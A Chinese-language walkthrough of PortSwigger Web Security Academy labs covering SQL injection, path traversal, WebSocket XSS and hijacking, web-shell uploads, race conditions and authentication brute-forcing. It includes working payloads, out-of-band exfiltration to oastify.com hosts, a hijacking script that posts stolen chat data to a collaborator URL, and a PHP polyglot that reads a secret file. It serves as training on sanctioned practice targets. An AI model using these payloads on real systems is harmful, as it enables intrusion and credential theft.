# 1 .portswigger-SQL

## 	

## 1.实验室：WHERE 子句中的 SQL 注入漏洞允许检索隐藏数据

![image-20250711142328146](portswigger.assets/image-20250711142328146.png)

进入靶场 选择一个类![image-20250711142514944](portswigger.assets/image-20250711142514944.png)

用单引号'闭合语句 然后注入or 1=1🧊用--注释后面的语句

![image-20250711142643669](portswigger.assets/image-20250711142643669.png)



## 2.实验室：允许绕过登录的 SQL 注入漏洞

![image-20250711143944327](portswigger.assets/image-20250711143944327.png)

![image-20250711143813555](portswigger.assets/image-20250711143813555.png)

直接用单引号 闭合 密码验证 --注释掉后面的语句

![image-20250711144246008](portswigger.assets/image-20250711144246008.png)



## 3.实验室：SQL注入攻击，查询Oracle数据库类型和版本

![image-20250711153925698](portswigger.assets/image-20250711153925698.png)

![image-20250711154047184](portswigger.assets/image-20250711154047184.png)

能访问到orderby2 说明有两个字段

' union select '1','2' from dual--  `dual` 是 Oracle 中的一个**虚拟表**，用于从没有实际表的地方进行查询。

![image-20250711155448961](portswigger.assets/image-20250711155448961.png)

`v$version` 是 Oracle 中的一个**动态性能视图（dynamic performance view）**，用于显示数据库的版本信息和组件信息。

![image-20250711155658561](portswigger.assets/image-20250711155658561.png)

## 4.实验室：SQL 注入攻击，查询 MySQL 和 Microsoft 的数据库类型和版本

![image-20250711160841614](portswigger.assets/image-20250711160841614.png)

![image-20250711162028359](portswigger.assets/image-20250711162028359.png)		

这个实验用了#而不是--查阅资料 --后面必须紧贴空格或者换行 所以要在后面再加空格才能生效![image-20250711162438029](portswigger.assets/image-20250711162438029.png)

这样就可以



## 5.实验室：SQL 注入攻击，列出非 Oracle 数据库上的数据库内容

![image-20250711165132689](portswigger.assets/image-20250711165132689.png)

先sql注入来登录为止密码的账号

![image-20250711165315627](portswigger.assets/image-20250711165315627.png)

![image-20250711170514341](portswigger.assets/image-20250711170514341.png)

报库名：**category=Gifts' union SELECT '1',schema_name from information_schema.schemata--**

![image-20250711180919350](portswigger.assets/image-20250711180919350.png)

报表名 猜测用户信息在punlic里：**category=Gifts' union SELECT '1',table_name from information_schema.tables where table_schema='public'**

![image-20250711181007618](portswigger.assets/image-20250711181007618.png)

爆字段名：**category=Gifts' union SELECT '1',column_name from information_schema.columns where table_name='users_ddcldd'**

![image-20250711181048186](portswigger.assets/image-20250711181048186.png)

爆密码 **category=Gifts' union SELECT '1',password_xsiwdv from users_ddcldd where username_ladwob='administrator'-- **

![image-20250711181428894](portswigger.assets/image-20250711181428894.png)

最后登录账户即可



## 6.实验室：SQL 注入攻击，列出 Oracle 数据库内容

![image-20250711184502893](portswigger.assets/image-20250711184502893.png)

| 目标                                  | 视图名                      | 说明                                          |
| ------------------------------------- | --------------------------- | --------------------------------------------- |
| 🔍 当前用户名（当前 schema）           | `SELECT user FROM dual`     | Oracle 中“库”和“用户”本质上是一回事（schema） |
| 📦 所有用户（相当于 MySQL 的“数据库”） | `all_users` / `dba_users`   | 所有 schema 名（需要 DBA 权限）               |
| 📁 当前用户的表                        | `user_tables`               | 当前用户自己创建的所有表                      |
| 📁 所有可访问的表                      | `all_tables`                | 当前用户“能看到”的所有表（包括自己和别人的    |
| 📄 当前表的字段                        | `user_tab_columns`          | 当前用户表的字段信息                          |
| 📄 所有可访问表的字段                  | `all_tab_columns`           | 当前用户可见所有表的字段信息                  |
| 库 表 字段                            | user table_name column_name |                                               |

先测试出字段 ![image-20250711184701760](portswigger.assets/image-20250711184701760.png)

查看一下库名（用户名）：**category=Lifestyle' union select '1',username from all_users--**

![image-20250711185051793](portswigger.assets/image-20250711185051793.png)

其中还能查看自己的用户是peter：**category=Lifestyle' union select '1',user from dual--**

再爆表：**category=Lifestyle' union select '1',table_name from user_tables--**

![image-20250711185608855](portswigger.assets/image-20250711185608855.png)

爆字段：**category=Lifestyle' union select '1',column_name from user_tab_columns where table_name='USERS_OBKNHE'--**

![image-20250711190002782](portswigger.assets/image-20250711190002782.png)

获取字段：**category=Lifestyle' union select '1',PASSWORD_TZLNYE from USERS_OBKNHE where USERNAME_YCBRET='administrator'--**

![image-20250711190154295](portswigger.assets/image-20250711190154295.png)

拿到密码 登录结束



## 7.实验室：SQL 注入 UNION 攻击，确定查询返回的列数

![image-20250711215237286](portswigger.assets/image-20250711215237286.png)

![image-20250711215451269](portswigger.assets/image-20250711215451269.png)

让我确定列数 

直接**' order by 4--**确定了只有三列，然后看要求需要返回空行 那就**Pets'union select NULL,NULL,NULL--**



## 8.实验室：SQL 注入 UNION 攻击，查找包含文本的列

![image-20250711221619132](portswigger.assets/image-20250711221619132.png)

![image-20250711222214881](portswigger.assets/image-20250711222214881.png)

![image-20250711222432600](portswigger.assets/image-20250711222432600.png)



## 9.实验室：SQL 注入 UNION 攻击，从其他表检索数据

![image-20250711222734953](portswigger.assets/image-20250711222734953.png)

先确定两列![image-20250711222947475](portswigger.assets/image-20250711222947475.png)

![image-20250711223534155](portswigger.assets/image-20250711223534155.png)



## 10.实验室：SQL 注入 UNION 攻击，检索单个列中的多个值

![image-20250712002704329](portswigger.assets/image-20250712002704329.png)

| 数据库         | 拼接写法   | 示例                              |
| -------------- | ---------- | --------------------------------- |
| **Oracle**     | `          |                                   |
| **MySQL**      | `CONCAT()` | `CONCAT(username, '~', password)` |
| **PostgreSQL** | `          |                                   |
| **SQL Server** | `+`        | `username + '~' + password`       |

![image-20250712002916069](portswigger.assets/image-20250712002916069.png)

发现“1”是不回显的，直接跳到最后一步

**category=Gifts' union select '1',username || '~' || password from users where username='administrator'--**

![image-20250712003715021](portswigger.assets/image-20250712003715021.png)

或者用mysql的concat **category=Gifts' union select '1',concat(username,',',password) from users where username='administrator'--**

![image-20250712003816583](portswigger.assets/image-20250712003816583.png)



## 11.实验室：使用条件响应进行盲 SQL 注入

![image-20250712130659473](portswigger.assets/image-20250712130659473.png)

在cookie注入and 1=1 发现有welcome字样![image-20250712131619645](portswigger.assets/image-20250712131619645.png)

1=2时没有 说明存在注入	

判断有无users表 **TrackingId=BAUkmwic7zEx9Jvb'and (select 'a' from users limit 1)='a;**

![image-20250712133343573](portswigger.assets/image-20250712133343573.png)

再确认存在用户**TrackingId=BAUkmwic7zEx9Jvb'and (select 'a' from users where username='administrator')='a;**

![image-20250712133457292](portswigger.assets/image-20250712133457292.png)

然后判断密码长度**TrackingId=BAUkmwic7zEx9Jvb'and (select 'a' from users where username='administrator' and length(password)>19)='a;**

判断密码是20位，然后，盲注字符

**TrackingId=8cHtTyl50BvkDVEL'and (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='r;**

or

**TrackingId=8cHtTyl50BvkDVEL' and substring((select password from users where username='administrator'),1,1)='r;**

![image-20250712144647256](portswigger.assets/image-20250712144647256.png)、



![image-20250712145940922](portswigger.assets/image-20250712145940922.png)

rhn23a4i0aptq00bu1cm



## 12.实验室：带有条件错误的盲 SQL 注入

报错注入![image-20250712162014449](portswigger.assets/image-20250712162014449.png)

**TrackingId=YOit8pgzOpUb0WmS' and (select 'a' from dual) = 'a**

![image-20250712163645139](portswigger.assets/image-20250712163645139.png)

报错 说明不是mysql 用dual成功说明是oc库 （要用from dual 和to_char）

尝试注入 先用永真或者永假**TrackingId=YOit8pgzOpUb0WmS' and (select case when (1=2) then to_char(1/0) else 'a' end from dual)='a**

然后爆破**TrackingId=YOit8pgzOpUb0WmS' and (select case when (subsring(password,1,1)='a') then to_char(1/0) else 'a' end from users where username='administrator')='a;**

![image-20250712163733358](portswigger.assets/image-20250712163733358.png)

![image-20250712170031749](portswigger.assets/image-20250712170031749.png)

tvjeq4slj2tadfi36shl

## 13.实验室：基于错误的可见 SQL 注入

![image-20250712230622726](portswigger.assets/image-20250712230622726.png)

![image-20250712231326454](portswigger.assets/image-20250712231326454.png)

后面后好像被截断了

![image-20250712232002465](portswigger.assets/image-20250712232002465.png)

**TrackingId=' and 1=cast((select username from users) as int)-- ;**提示返回了多行

![image-20250712232150523](portswigger.assets/image-20250712232150523.png)

加上limit后

![image-20250712232237562](portswigger.assets/image-20250712232237562.png)

找到了administrator，那就说明密码的第一行也是admin的

![image-20250712232454286](portswigger.assets/image-20250712232454286.png)



## 14.	实验室：具有时间延迟的盲 SQL 注入

![image-20250712232803833](portswigger.assets/image-20250712232803833.png)

**TrackingId=x'||pg_sleep(10)--**

| 数据库类型               | 延迟函数 / 方法                           | 判断语句模板（示例）                                         | 说明与特性                     |
| ------------------------ | ----------------------------------------- | ------------------------------------------------------------ | ------------------------------ |
| **MySQL**                | `SLEEP(seconds)`                          | `' OR IF(1=1, SLEEP(5), 0)-- `                               | SLEEP 函数延迟执行；IF 判断    |
| **PostgreSQL**           | `pg_sleep(seconds)`                       | `' OR (SELECT CASE WHEN 1=1 THEN pg_sleep(5) ELSE pg_sleep(0) END)-- ` | 支持 CASE、pg_sleep            |
| **Oracle**               | `dbms_pipe.receive_message('a', seconds)` | `'                                                           |                                |
| **Microsoft SQL Server** | `WAITFOR DELAY 'HH:MM:SS'`                | `'; IF(1=1) WAITFOR DELAY '0:0:5'-- `                        | 只接受字符串格式的 DELAY 参数  |
| **SQLite**               | ❌ 无内置延迟函数                          | ❌ 不支持常规时间盲注函数                                     | 通常需配合逻辑判断结合其他方式 |



## 15.实验室：具有时间延迟和信息检索的盲 SQL 注入

![image-20250712235446157](portswigger.assets/image-20250712235446157.png)

**TrackingId=jcIdfkZhtgsliKvJ' || (select case when(1=1) then pg_sleep(5) else '' end)-- **

设置资源池最大并发数量为1 

**TrackingId=jcIdfkZhtgsliKvJ' || (select case when((select substring(password,1,1) from users where username='administrator')='a') then pg_sleep(10) else '' end)-- ;**

![image-20250713000856248](portswigger.assets/image-20250713000856248.png)



## 16.实验室：带外交互的盲 SQL 注入

**TrackingId=NXWIBOr6nmw4QgYk'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http://ophuu0y4cuor52mhof4b4mspug07o0cp.oastify.com">+%25remote%3b]>'),'/l')+FROM+dual--; **

![image-20250713003129305](portswigger.assets/image-20250713003129305.png)

![image-20250713003121009](portswigger.assets/image-20250713003121009.png)



## 17.实验室：盲 SQL 注入与带外数据泄露

![image-20250713004917493](portswigger.assets/image-20250713004917493.png)

![image-20250713011014918](portswigger.assets/image-20250713011014918.png)



**TrackingId=6JERDzuKsyGMSWEA'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.il7oquuy8okl1wibk9050gojqaw3ku8j.oastify.com">+%25remote%3b]>'),'/l')+FROM+dual--**



## 18.实验室：通过 XML 编码绕过过滤器的 SQL 注入

![image-20250713012811572](portswigger.assets/image-20250713012811572.png)

按题目查询库存

![image-20250713012925013](portswigger.assets/image-20250713012925013.png)

被过滤

1. 在注入 XML 时，请尝试使用 XML 实体对有效载荷进行混淆。一种方法是使用[Hackvertor](https://portswigger.net/bappstore/65033cbd2c344fbabe57ac060b5dd100)扩展。只需突出显示您的输入，右键单击，然后选择**“扩展”>“Hackvertor”>“编码”>“dec_entities/hex_entities”**。
2. 重新发送请求，您会发现应用程序已正常响应。这表明您已成功绕过 WAF

![image-20250713013657090](portswigger.assets/image-20250713013657090.png)

![image-20250713013814483](portswigger.assets/image-20250713013814483.png)

| 编码方式名称（Hackvertor 标签） | 示例编码形式                       | 是否适合 SQL 注入      | 是否适合 XSS 绕过   | 是否用于绕过 WAF | 备注说明                                           |
| ------------------------------- | ---------------------------------- | ---------------------- | ------------------- | ---------------- | -------------------------------------------------- |
| `hex_entities`                  | `SELECT`（表示 `SELECT`）          | ✅ 非常适合             | ⚠️ 部分支持          | ✅ 很适合         | XML/HTML 实体十六进制，易被服务器解析但 WAF 常忽略 |
| `dec_entities`                  | `SELECT`（也是 `SELECT`）          | ✅ 非常适合             | ⚠️ 部分支持          | ✅ 很适合         | 十进制实体，效果和 hex_entities 类似               |
| `urlencode`                     | `%53%45%4C%45%43%54`               | ❌ 一般不适合           | ✅ 常用于 XSS        | ⚠️ WAF 有时识别   | URL 编码在 XML 请求中不一定被解码，SQL 注入效果差  |
| `html_entities`（HTML 实体名）  | `<script>`                         | ❌ 无效                 | ✅ 主要用于 XSS      | ❌                | 只能用于处理特殊 HTML 字符                         |
| `unicode_escape`                | `\u0053\u0045...`（表示 `SELECT`） | ⚠️ 仅某些场景支持       | ✅ 在某些 XSS 中有效 | ⚠️ 兼容性差       | 少数服务器支持 Unicode 转换，通用性不高            |
| `charcode_concat`               | `CHAR(83)                          |                        | CHAR(69)            |                  | ...`                                               |
| `base64`                        | `U0VMRUNUICogRlJPTSB1c2Vycz==`     | ❌ 无效                 | ⚠️ 特定 XSS 有效     | ❌                | 服务端不会自动解码 base64 成 SQL                   |
| `double_urlencode`              | `%2527`（实际为 `'`）              | ⚠️ 取决于服务端解码层数 | ⚠️                   | ⚠️ 有时可绕过     | 若服务端有多层解码机制时可用                       |
| `mysql_hex`（十六进制字符串）   | `0x53656c656374`（SELECT）         | ✅ MySQL 专用           | ❌                   | ✅                | 仅适用于 MySQL，可以 `SELECT 0x...`                |



# 2.路径遍历

## 19.实验：文件路径遍历，简单案例

![image-20250713233349535](portswigger.assets/image-20250713233349535.png)

![image-20250713234609776](portswigger.assets/image-20250713234609776.png)

![image-20250713234615487](portswigger.assets/image-20250713234615487.png)

| 请求                                    | 结果  | 原因                             |
| --------------------------------------- | ----- | -------------------------------- |
| `filename=../../../../etc/passwd`       | ✅成功 | 操作系统能正确解析路径           |
| `filename=26.jpg../../../../etc/passwd` | ❌失败 | 被当作一个“长文件名”，而不是路径 |

还有`/var/www/images/26.jpg` 是一个文件，不是目录

你在尝试“进入” `26.jpg`，然后“回退到父目录”

但：**你不能进入一个文件（不是目录）再去找子路径**！

`26.jpg` 是个文件

系统尝试进入 `26.jpg` 目录（因为你用了 `/`），但发现它不是目录，于是报错

## 20.实验室：文件路径遍历，使用绝对路径绕过阻止遍历序列

![image-20250713235256280](portswigger.assets/image-20250713235256280.png)

直接访问https://0a4000c603628d8b80a8a89f006000e8.web-security-academy.net/image?filename=/etc/passwd



## 21.实验室：文件路径遍历，非递归地剥离遍历序列

![image-20250713235501154](portswigger.assets/image-20250713235501154.png)

如果是黑名单删除就直接让删除后的符号起作用

/image?filename=....//....//....//....//....//etc/passwd



## 22.实验室：文件路径遍历，遍历序列去除多余的 URL 解码

![image-20250714000530177](portswigger.assets/image-20250714000530177.png)

![image-20250714001411156](portswigger.assets/image-20250714001411156.png)



## 23.实验室：文件路径遍历，路径起始验证

![image-20250714001608578](portswigger.assets/image-20250714001608578.png)

![image-20250714001908451](portswigger.assets/image-20250714001908451.png)



## 24.实验室：文件路径遍历，使用空字节绕过验证文件扩展名

![image-20250714002040704](portswigger.assets/image-20250714002040704.png)

后端限定了后缀 用空字节阶段

![image-20250714002902381](portswigger.assets/image-20250714002902381.png)

有时服务器会先拼接 `.jpg`，然后再做 URL 解码或字符处理。

如果你输入：

```
../../../../etc/passwd%00.jpg
```

经过字符串拼接和处理后，可能被理解为：

```
"../../../../etc/passwd" + "\0" + ".jpg"
```



# 3. WebSockets

## 25.实验：操纵 WebSocket 消息以利用漏洞

![image-20250714011636581](portswigger.assets/image-20250714011636581.png)

![image-20250714012758354](portswigger.assets/image-20250714012758354.png)



| 部分                 | 含义                                                         |
| -------------------- | ------------------------------------------------------------ |
| `<img ...>`          | 这是一个 HTML 图像标签，用来插入图片                         |
| `src=1`              | 图片路径是 `1`，这是个**无效路径**（图片加载会失败）         |
| `onerror='alert(1)'` | 图片加载失败时触发 `onerror` 事件，执行 JavaScript 代码：`alert(1)` |

onerror=alert('a')



## 26.实验室：操纵 WebSocket 握手来利用漏洞

![image-20250714014521023](portswigger.assets/image-20250714014521023.png)

直接弹窗发现失败报错

![image-20250714014715723](portswigger.assets/image-20250714014715723.png)

重连发现ip地址被拉黑了![image-20250714014938990](portswigger.assets/image-20250714014938990.png)

![image-20250714015504509](portswigger.assets/image-20250714015504509.png)

用XFF伪造ip 然后简单绕过**<img src=1 oNerror=alert`1`>**

![image-20250714020332933](portswigger.assets/image-20250714020332933.png)



## 27.	实验室：跨站点 WebSocket 劫持

![image-20250714164319647](portswigger.assets/image-20250714164319647.png)

这题的大致意思是：

> 💬 这个在线商店有一个「实时聊天功能」，是通过 **WebSocket** 实现的。

> 你要**构造一段 HTML/JavaScript 攻击代码**，放在平台提供的**Exploit Server** 上，引诱受害者访问。

> 当受害者访问你构造的网页时，你的攻击代码会通过 WebSocket 劫持受害者的聊天连接，从中**获取他们的聊天记录**（含敏感信息，比如登录链接、令牌、验证码等）。

> 然后你再**使用这个聊天记录中的信息，登录受害者的账户，完成实验通关**。

![image-20250714164706537](portswigger.assets/image-20250714164706537.png)

先随便发两条消息 看看websocket历史记录里的握手连接的报文

![image-20250714215535832](portswigger.assets/image-20250714215535832.png)

看到ready是链接成功

找到相应的http历史

![image-20250714215654189](portswigger.assets/image-20250714215654189.png)

右键复制网址放入脚本

再复制一个collaboratorpayload： wttdics1dsw35eln4kes9e5s8jeb21qq.oastify.com 放入

<script>    var ws = new WebSocket('wss://your-websocket-url');    ws.onopen = function() {        ws.send("READY");    };    ws.onmessage = function(event) {        fetch('https://your-collaborator-url', {method: 'POST', mode: 'no-cors', body: event.data});    }; </script>

![image-20250714215903034](portswigger.assets/image-20250714215903034.png)

尝试链接，按下查看漏洞测试，点击collaborator的立即轮询

![image-20250714220140525](portswigger.assets/image-20250714220140525.png)

能看到有聊天记录 ，直接发给用户 ，在聊天记录中看到账号密码

![image-20250714220240709](portswigger.assets/image-20250714220240709.png)



# 4. 文件上传漏洞



## 28.实验室：通过 Web Shell 上传执行远程代码

![image-20250714223207290](portswigger.assets/image-20250714223207290.png)



![image-20250714223454202](portswigger.assets/image-20250714223454202.png)

![image-20250714223511440](portswigger.assets/image-20250714223511440.png)

返回帐户页面，头像预览现已显示在页面上。

![image-20250714224954940](portswigger.assets/image-20250714224954940.png)

![image-20250714223954716](portswigger.assets/image-20250714223954716.png)

![image-20250714224122153](portswigger.assets/image-20250714224122153.png)

能执行 直接读取数据

![image-20250714224355613](portswigger.assets/image-20250714224355613.png)



## 29.实验室：通过绕过 Content-Type 限制上传 Web shell

![image-20250714225702368](portswigger.assets/image-20250714225702368.png)

直接上传php文件会报错：只能上传图片

![image-20250714225942463](portswigger.assets/image-20250714225942463.png)

更改MIME![image-20250714230057719](portswigger.assets/image-20250714230057719.png)

![image-20250714230830041](portswigger.assets/image-20250714230830041.png)



## 30.实验：通过路径遍历上传 Web shell

![image-20250714232346018](portswigger.assets/image-20250714232346018.png)

直接上传再打开图片 会发现txt形式返回我的文件内容

在上传的文件名前面加../并url编码

然后访问file/muma.php即可

| 技术点           | 说明                                                |
| ---------------- | --------------------------------------------------- |
| PHP 脚本执行限制 | avatars 目录不能执行 PHP，files 目录可以            |
| 路径穿越         | 上传时使用 `filename="../exploit.php"` 尝试穿越路径 |
| URL 编码绕过     | 把 `/` 写成 `%2f`，让服务器解码后实现穿越           |
| WebShell         | `file_get_contents()` 读取敏感文件                  |



## 31.实验室：通过扩展黑名单绕过上传 Web shell

![image-20250714235935700](portswigger.assets/image-20250714235935700.png)

上传php文件返回![image-20250715000225418](portswigger.assets/image-20250715000225418.png)

![image-20250715000253651](portswigger.assets/image-20250715000253651.png)

![image-20250715000329506](portswigger.assets/image-20250715000329506.png)

然后yjh请求查看文件即可

![image-20250715000455795](portswigger.assets/image-20250715000455795.png)



## 32.实验：通过混淆的文件扩展名上传 Web shell

![image-20250715000947299](portswigger.assets/image-20250715000947299.png)

| 绕过方法     | 文件名变体                       |
| ------------ | -------------------------------- |
| 大小写混淆   | `shell.pHp`, `shell.PhP`         |
| 双后缀       | `shell.php.jpg`, `shell.php.png` |
| 尾部字符     | `shell.php.`, `shell.php   `     |
| URL 编码     | `shell%2Ephp`, `shell%252ephp`   |
| 分号绕过     | `shell.asp;.jpg`                 |
| Null 截断    | `shell.php%00.jpg`               |
| Unicode 变点 | `shell\xc0\x2ephp`               |

![image-20250715001326094](portswigger.assets/image-20250715001326094.png)

提示只有图片能上传， 然后经测试其他什么都不能传

![image-20250715001551971](portswigger.assets/image-20250715001551971.png)

NULL截断绕过 随后照常访问files/avatars/muma.php并命令执行即可



## 33.实验室：通过多语言 Web Shell 上传执行远程代码

![image-20250715152150311](portswigger.assets/image-20250715152150311.png)

上传图片码

![image-20250715152345515](portswigger.assets/image-20250715152345515.png)

（创建一个多语言 PHP/JPG 文件，该文件本质上是一张普通图片，但其元数据中包含 PHP 有效负载。一个简单的方法是从命令行下载并运行 ExifTool，如下所示：

```
exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" <YOUR-INPUT-IMAGE>.jpg -o polyglot.php）
```





# 5.**竞争条件** race condition



## 34.实验室：限制溢出竞争条件

![image-20250715163525141](portswigger.assets/image-20250715163525141.png)

更具指示 将物品加入购物车 发现能用优惠券降低价格 但只能使用一次

![image-20250715165753142](portswigger.assets/image-20250715165753142.png)

还是不够 反复发送

![image-20250715165807066](portswigger.assets/image-20250715165807066.png)

尝试无数次以后终于成功![image-20250715170352594](portswigger.assets/image-20250715170352594.png)

买下夹克![image-20250715170411308](portswigger.assets/image-20250715170411308.png)





## 35.实验室：通过竞争条件绕过速率限制

![image-20250715171009588](portswigger.assets/image-20250715171009588.png)

1. 右键单击并选择**扩展> Turbo Intruder> 发送到 turbo intruder**。

2. 在 Turbo Intruder 中，在请求编辑器中，请注意参数的值`password`会自动用占位符标记为有效载荷位置`%s`。

3. 将参数更改`username`为`carlos`。

4. 从下拉菜单中选择`examples/race-single-packet-attack.py`模板。

5. 在 Python 编辑器中，编辑模板，以便您的攻击使用每个候选密码将请求排队一次。为简单起见，您可以复制以下示例：

   ```python
   def queueRequests(target, wordlists):
   
       # as the target supports HTTP/2, use engine=Engine.BURP2 and concurrentConnections=1 for a single-packet attack
       engine = RequestEngine(endpoint=target.endpoint,
                              concurrentConnections=1,
                              engine=Engine.BURP2
                              )
       
       # assign the list of candidate passwords from your clipboard
       passwords = wordlists.clipboard
       
       # queue a login request using each password from the wordlist
       # the 'gate' argument withholds the final part of each request until engine.openGate() is invoked
       for password in passwords:
           engine.queue(target.req, password, gate='1')
       
       # once every request has been queued
       # invoke engine.openGate() to send all requests in the given gate simultaneously
       engine.openGate('1')
   
   
   def handleResponse(req, interesting):
       table.add(req)
   ```

6. 请注意，我们通过引用从剪贴板分配密码列表`wordlists.clipboard`。将候选密码列表复制到剪贴板。

7. 發起攻擊。

8. 研究答案。

   - 如果您没有成功登录，请等待帐户锁重置，然后重复攻击。您可能需要从列表中删除任何您知道不正确的密码。
   - 如果收到 302 响应，则表示登录成功。请记下**Payload**列中对应的密码。



![image-20250715173300188](portswigger.assets/image-20250715173300188.png)

302说明重定向了 找到密码

![image-20250715174240281](portswigger.assets/image-20250715174240281.png)

最后登录即可



## 36.实验室：多端点竞争条件

![image-20250715230518075](portswigger.assets/image-20250715230518075.png)

先predict，执行加入购物车 买东西等操作 看历史看看发了哪些请求

![image-20250715230611127](portswigger.assets/image-20250715230611127.png)

随后测试行为 ，看看时间，有没有竞争窗口

![image-20250715223716784](portswigger.assets/image-20250715223716784.png)

把加入数据库请求和验证购买请求single connect执行，反复测试，看右下角发现加入购物车 所用时间更长

再加入竞争warming GET/cart 的查询购物车请求（去除建立连接所用时长等的干扰）

![image-20250715224056705](portswigger.assets/image-20250715224056705.png)

反复检查 发现这两个的时间几乎一样了，所以 推论：这是 **后端连接架构带来的固定延迟**，而不是逻辑处理不一致

清空购物车 再按顺序执行一遍 还原了加入购物车 并check购买 发现买不起的操作



接下来尝试加入购物卡 进行并行操作（证明猜想）

[ /cart 加夹克 ← 执行中... ]
                      \
                       --> [ /checkout 开始读取购物车（还没写完） ]

即结账买礼物卡 实际上偷偷加入夹克结账

先把购买礼物卡的包 check抓下来 放到repeater中和加入夹克成组![image-20250715225741352](portswigger.assets/image-20250715225741352.png)



随后并行发包，一次就成功了

![image-20250715225814037](portswigger.assets/image-20250715225814037.png)

看到同时买了夹克和礼物卡

如果cart操作总是比check快就要用到插件，去让cart更慢：

**改用 Turbo Intruder 脚本强制控制时间点**

你可以这样操作：

- 把 `/checkout` 设置成先进入服务器逻辑
- 等它刚好到一半时，**强行插入 `/cart` 请求**

这需要用 Turbo Intruder 的 `engine.openGate()` 精确控制：

```
python复制编辑engine.queue(req1, gate='race')   # checkout
engine.queue(req2, gate='race')   # cart
engine.openGate('race')           # 同时释放
```

甚至还可以插入 sleep 让其中一个晚到一点点 ➜ 更容易命中 race window。

**还有一个机制Rate Limiting✅ 背景知识：服务器的速率限制（Rate Limiting）**

大多数服务器都有如下机制：

- 如果检测到同一 IP 或同一用户 **短时间内发太多请求**
- 会对**后续请求施加延迟（Delay）**
- 有些还会限制线程数、连接池数量（资源限制）



## 37.实验室：单端点竞争条件

![image-20250715235352142](portswigger.assets/image-20250715235352142.png)

登录账号 有改邮箱功能  其中还有客户端模拟我的邮箱去接受改密码的验证邮件，实验目的是把邮箱改为carlos的

![image-20250716001705064](portswigger.assets/image-20250716001705064.png)

构造两个session，一个发送验证到我的邮件，一个发送到carlos

进行反复并行发送 同时观察邮箱

![image-20250716002228708](portswigger.assets/image-20250716002228708.png)

发现carlos的发到我的邮箱了 登录获取管理员权限



## 38.41.实验室：部分构造竞争条件

## ![image-20250717163451612](portswigger.assets/image-20250717163451612.png)

### 🧩 利用条件：

1. 对象创建是多步完成（如先插入用户，再设置 API key）。
2. 在“关键字段未初始化”前并发发起请求。
3. 利用未初始化字段（如 NULL、空字符串、空数组）绕过认证或权限控制。

### 💥 典型危害：

- 绕过 API key 验证，伪造身份访问敏感数据。
- 趁密码还未设置，用空密码登录。
- 利用邮箱验证流程，把别人的邮箱变成自己的。
- 未完成注册时提升权限（如注册变管理员）。

------

### 🧪 利用技巧：

- 使用 **Turbo Intruder** 并发发送“注册”和“认证”请求。
- 利用非标准参数传递空值：
  - `api-key[]=` → `[null]`
  - `param[key]=` → `{key: null}`

查看注册登录的源码 

![image-20250717170233281](portswigger.assets/image-20250717170233281.png)

这段代码会在包含 `token` 参数的确认邮箱页面上，**生成一个点击即可确认的按钮**，实际发送的是：

似乎confirm接口是用户点击链接跳转后，页面自动渲染一个“Confirm”按钮来发起确认操作。

<img src="portswigger.assets/image-20250717171505188.png" alt="image-20250717171505188"  />![image-20250717171518140](portswigger.assets/image-20250717171518140.png)![image-20250717171530421](portswigger.assets/image-20250717171530421.png)

有这三种错误，我想再服务器还未来得及写入token的时候跳过认证

intruct组包 预热 观察时间 发现是有机会条件竞争的

![image-20250717174406460](portswigger.assets/image-20250717174406460.png)



注册成功

## 39.实验室：利用时间敏感漏洞

![image-20250716150614305](portswigger.assets/image-20250716150614305.png)

尝试先重制密码 发现

看链接名  token 是带在 URL 中的，和用户名是**分开的参数**

🔎 这说明：token 不是和用户名绑定的（这是漏洞关键）

![image-20250716152827888](portswigger.assets/image-20250716152827888.png)

![image-20250716153448066](portswigger.assets/image-20250716153448066.png)

同时发送两个wiener的改密码的请求，但是session，csrf不一样，发现能接收到两个一样的token

然后把其中一个用户名换成carlas 发包后复制邮件

![image-20250716153829925](portswigger.assets/image-20250716153829925.png)

把username换成carlos 点击新邮件就能改carlos的密码



## 40.实验：通过竞争条件上传 Web shell

![image-20250717152410622](portswigger.assets/image-20250717152410622.png)

引入此竞争条件的易受攻击的代码如下：

```php
<?php 
$target_dir = "avatars/"; 
$target_file = $target_dir . $_FILES["avatar"]["name"]; 
// temporary move
move_uploaded_file($_FILES["avatar"]["tmp_name"], $target_file); 
if (checkViruses($target_file) && checkFileType($target_file)) {    
    echo "The file ". htmlspecialchars( $target_file). " has been uploaded."; 
} else {    unlink($target_file);    
        echo "Sorry, there was an error uploading your file.";    
        http_response_code(403); } function checkViruses($fileName) {
    // checking for viruses    ... } 
    function checkFileType($fileName) {    
        $imageFileType = strtolower(pathinfo($fileName,PATHINFO_EXTENSION));    
        if($imageFileType != "jpg" && $imageFileType != "png") {        
            echo "Sorry, only JPG & PNG files are allowed\n";        
            return false;    
        } 
        else {        
            return true;    
        } 
    } 
 ?>
```


尝试上传文件和读取文件并行处理 ![image-20250717155625803](portswigger.assets/image-20250717155625803.png)

成功率太低了 直接同时爆破![image-20250717163104449](portswigger.assets/image-20250717163104449.png)

无负载的一直发送 



# 6.**身份验证漏洞**



## 41.实验室：通过不同的响应枚举用户名

![image-20250716162852850](portswigger.assets/image-20250716162852850.png)

手动随意测试发现 登录界面会提示是不存在用户名，看看能不能枚举用户名

先枚举用户名 提高效率

![image-20250716164029436](portswigger.assets/image-20250716164029436.png)

找到有效用户名

然后爆破密码

![image-20250716164212308](portswigger.assets/image-20250716164212308.png)



## 42.实验室：通过略有不同的响应枚举用户名

![image-20250716164440058](portswigger.assets/image-20250716164440058.png)

![image-20250716164511130](portswigger.assets/image-20250716164511130.png)

随意登录一个 发现账号密码错误显示都一样了

按题目提示，设置中提取报错的信息 看看有没有不一样的错误提示

![image-20250716165342730](portswigger.assets/image-20250716165342730.png)

 发现有一个少个点![image-20250716165401387](portswigger.assets/image-20250716165401387.png)

最后爆破密码![image-20250716165721621](portswigger.assets/image-20250716165721621.png)



## 43.实验室：通过响应时间枚举用户名

![image-20250716165915704](portswigger.assets/image-20250716165915704.png)

看到不能简单的爆破用户名![image-20250716170224342](portswigger.assets/image-20250716170224342.png)

于是我加上XFF 伪造ip 为ip和username同时进行爆破 

